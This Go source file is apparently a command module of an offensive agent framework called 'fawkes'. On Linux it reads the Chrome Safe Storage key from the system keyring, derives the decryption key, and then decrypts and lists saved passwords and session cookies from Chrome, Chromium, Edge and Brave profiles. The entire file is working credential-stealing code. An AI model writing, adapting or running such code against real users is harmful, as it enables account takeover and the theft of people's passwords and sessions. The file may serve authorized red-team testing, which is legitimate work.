//go:build linux

package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"database/sql"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/crypto/pbkdf2"
)

// chromeSafeStorageKey retrieves the Chrome Safe Storage password from the Linux
// keyring (GNOME Keyring / KDE Wallet via secret-tool) and derives the AES-128-CBC
// key using PBKDF2. Falls back to "peanuts" if no keyring is available.
func chromeSafeStorageKey(browserName string) ([]byte, error) {
	// Map browser names to their keyring application names
	var appNames []string
	switch strings.ToLower(browserName) {
	case "chrome":
		appNames = []string{"chrome", "chromium"}
	case "chromium":
		appNames = []string{"chromium", "chrome"}
	case "edge":
		appNames = []string{"microsoft-edge"}
	case "brave":
		appNames = []string{"brave"}
	default:
		appNames = []string{strings.ToLower(browserName)}
	}

	// Try to retrieve password from GNOME Keyring / Secret Service via secret-tool
	var password string
	for _, app := range appNames {
		cmd := exec.Command("secret-tool", "lookup", "application", app)
		output, err := cmd.Output()
		if err == nil {
			password = strings.TrimSpace(string(output))
			if password != "" {
				break
			}
		}
	}

	// Fallback to default password when no keyring is available
	if password == "" {
		password = "peanuts"
	}

	// Derive AES-128 key: PBKDF2-HMAC-SHA1, salt="saltysalt", iterations=1, keylen=16
	// Linux uses 1 iteration (vs 1003 on macOS)
	key := pbkdf2.Key([]byte(password), []byte("saltysalt"), 1, 16, sha1.New)
	return key, nil
}

// chromeDecryptValue decrypts a Chrome v10-encrypted value using AES-128-CBC.
// Chrome Linux uses "v10" prefix + AES-128-CBC with IV of 16 spaces (0x20).
func chromeDecryptValue(encrypted []byte, key []byte) (string, error) {
	if len(encrypted) < 3 {
		return "", fmt.Errorf("ciphertext too short")
	}

	// Check for v10/v11 prefix (Linux Chrome encryption)
	prefix := string(encrypted[:3])
	if prefix != "v10" && prefix != "v11" {
		// Not encrypted or unknown format — return as-is
		return string(encrypted), nil
	}

	ciphertext := encrypted[3:]
	if len(ciphertext) == 0 {
		return "", nil
	}

	// AES-128-CBC with IV = 16 spaces
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("cipher init failed: %w", err)
	}

	if len(ciphertext)%aes.BlockSize != 0 {
		return "", fmt.Errorf("invalid ciphertext length: %d", len(ciphertext))
	}

	iv := make([]byte, aes.BlockSize)
	for i := range iv {
		iv[i] = 0x20 // space character
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS7 padding
	if len(plaintext) > 0 {
		padding := int(plaintext[len(plaintext)-1])
		if padding > 0 && padding <= aes.BlockSize {
			valid := true
			for i := len(plaintext) - padding; i < len(plaintext); i++ {
				if plaintext[i] != byte(padding) {
					valid = false
					break
				}
			}
			if valid {
				plaintext = plaintext[:len(plaintext)-padding]
			}
		}
	}

	return string(plaintext), nil
}

// browserChromiumCookies extracts and decrypts cookies from Chromium-based browsers on Linux.
func browserChromiumCookies(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type cookieEntry struct {
		Browser    string
		Host       string
		Name       string
		Value      string
		Path       string
		Expiry     string
		IsSecure   bool
		IsHTTPOnly bool
	}

	var allEntries []cookieEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if isFirefoxBrowser(browserName) {
			continue
		}
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		key, err := chromeSafeStorageKey(browserName)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
			continue
		}

		profiles := findProfilesWithFile(userDataDir, "Cookies")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "Cookies")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies ORDER BY last_access_utc DESC LIMIT 500")
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var host, name, path string
				var encryptedValue []byte
				var expiresUTC int64
				var isSecure, isHTTPOnly int

				if err := rows.Scan(&host, &name, &encryptedValue, &path, &expiresUTC, &isSecure, &isHTTPOnly); err != nil {
					continue
				}

				value := ""
				if len(encryptedValue) > 0 {
					decrypted, err := chromeDecryptValue(encryptedValue, key)
					if err != nil {
						value = fmt.Sprintf("[decrypt error: %v]", err)
					} else {
						value = decrypted
					}
				}

				allEntries = append(allEntries, cookieEntry{
					Browser:    label,
					Host:       host,
					Name:       name,
					Value:      truncStr(value, 100),
					Path:       path,
					Expiry:     chromeTimeToString(expiresUTC),
					IsSecure:   isSecure != 0,
					IsHTTPOnly: isHTTPOnly != 0,
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Chromium Cookies (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		flags := ""
		if e.IsSecure {
			flags += " [Secure]"
		}
		if e.IsHTTPOnly {
			flags += " [HttpOnly]"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s: %s = %s  (path: %s, expires: %s)%s\n",
			e.Browser, e.Host, e.Name, e.Value, e.Path, e.Expiry, flags))
	}

	if len(allEntries) == 0 {
		sb.WriteString("No Chromium cookies found.\n")
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}

// browserChromiumPasswords extracts and decrypts saved passwords from Chromium-based browsers on Linux.
func browserChromiumPasswords(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type passwordEntry struct {
		Browser  string
		URL      string
		Username string
		Password string
	}

	var allEntries []passwordEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if isFirefoxBrowser(browserName) {
			continue
		}
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		key, err := chromeSafeStorageKey(browserName)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
			continue
		}

		profiles := findProfilesWithFile(userDataDir, "Login Data")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "Login Data")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0 ORDER BY date_last_used DESC LIMIT 500")
			if err != nil {
				// Try without blacklisted_by_user filter (older schema)
				rows, err = db.Query("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_last_used DESC LIMIT 500")
				if err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
					cleanup()
					continue
				}
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var originURL, username string
				var passwordBlob []byte

				if err := rows.Scan(&originURL, &username, &passwordBlob); err != nil {
					continue
				}

				password := ""
				if len(passwordBlob) > 0 {
					decrypted, err := chromeDecryptValue(passwordBlob, key)
					if err != nil {
						password = fmt.Sprintf("[decrypt error: %v]", err)
					} else {
						password = decrypted
					}
				}

				if originURL == "" && username == "" && password == "" {
					continue
				}

				allEntries = append(allEntries, passwordEntry{
					Browser:  label,
					URL:      originURL,
					Username: username,
					Password: password,
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Chromium Passwords (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		sb.WriteString(fmt.Sprintf("Browser Credentials [%s]\n  URL: %s\n  Username: %s\n  Password: %s\n\n",
			e.Browser, truncStr(e.URL, 120), e.Username, e.Password))
	}

	if len(allEntries) == 0 {
		sb.WriteString("No saved passwords found.\n")
	}

	if len(errors) > 0 {
		sb.WriteString("--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}

// Ensure sql.NullString is importable (used by openBrowserDB)
var _ = sql.ErrNoRows
